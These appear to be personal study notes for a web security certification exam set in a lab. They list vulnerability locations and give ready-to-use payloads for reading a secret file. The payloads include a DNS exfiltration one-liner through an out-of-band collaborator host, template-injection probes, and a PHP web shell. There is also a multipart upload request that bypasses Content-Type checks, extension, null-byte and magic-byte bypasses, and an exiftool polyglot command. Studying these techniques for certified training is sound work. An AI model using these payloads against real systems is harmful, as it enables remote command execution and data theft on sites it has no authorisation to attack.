# Stage 3: File System Access

## Overview
Stage 3 focuses on reading `/home/carlos/secret` from the file system. This is the final stage to complete the exam.

## Common Vulnerability Locations

### 📁 File Upload
- Web shell upload
- Path traversal in filename
- Extension blacklist bypass

### 📧 Feedback Forms
- OS command injection in email field
- SSTI in message field

### 📦 Product Stock Check
- XXE injection in XML
- SSRF via XML external entities

### 🖼️ Image Display
- Path traversal in filename parameter
- SSRF via image URL

### 🔍 Product Details
- SSTI in "out of stock" message
- Template injection in dynamic content

## Vulnerability Checklist

- [ ] OS command injection in feedback forms
- [ ] Path traversal in image parameters
- [ ] SSTI in product details
- [ ] XXE in stock check XML
- [ ] SSRF in admin panel features
- [ ] File upload with web shell
- [ ] Insecure deserialization in cookies

## Key Tools

- **Burp Collaborator** - For out-of-band data exfiltration
- **Burp Scanner** - Detects most vulnerabilities
- **Hackvertor** - For XXE encoding

## Quick Tips

1. **OS Command Injection** - Use DNS exfiltration: `nslookup $(cat /home/carlos/secret).burp.oastify.com`
2. **Path Traversal** - URL-encode entire payload if WAF blocks
3. **SSTI** - Test template expressions: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
4. **XXE** - Scan stock check requests
5. **SSRF** - Check admin panel "Download report" features, try port 6566

---






# File Upload Vulnerabilities

## 🎯 Target Location

**Primary Target:** My Account - Avatar Upload

## 🔥 Attack Techniques

### Web Shell Upload
**Goal:** Upload PHP/JSP/ASP web shell to execute commands

**Basic PHP Web Shell:**
```php
<?php system($_GET['cmd']); ?>
```

**Usage:**
```
/files/shell.php?cmd=cat /home/carlos/secret
```

---

### Content-Type Bypass
**Scenario:** Server checks `Content-Type` header

**Bypass:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

---

### Extension Blacklist Bypass

#### Alternative Extensions
```
.php → .php3, .php4, .php5, .phtml, .phar
.asp → .aspx, .cer, .asa
.jsp → .jspx, .jsw, .jsv, .jspf
```

#### Case Variation
```
.php → .pHp, .PhP, .PHP
```

#### Null Byte
```
shell.php%00.jpg
```

---

### Magic Bytes (File Signature) Bypass
**Add magic bytes to PHP shell:**
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

---

### Polyglot File
**Create polyglot:**
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
```

## 🎓 Exam Tips

1. **Check avatar upload** - Most common file upload location
2. **Try web shell first** - `<?php system($_GET['cmd']); ?>`
3. **Bypass Content-Type** - Change to `image/jpeg`
4. **Try alternative extensions** - `.php5`, `.phtml`, etc.
5. **Add magic bytes** - `GIF89a;` before PHP code

---

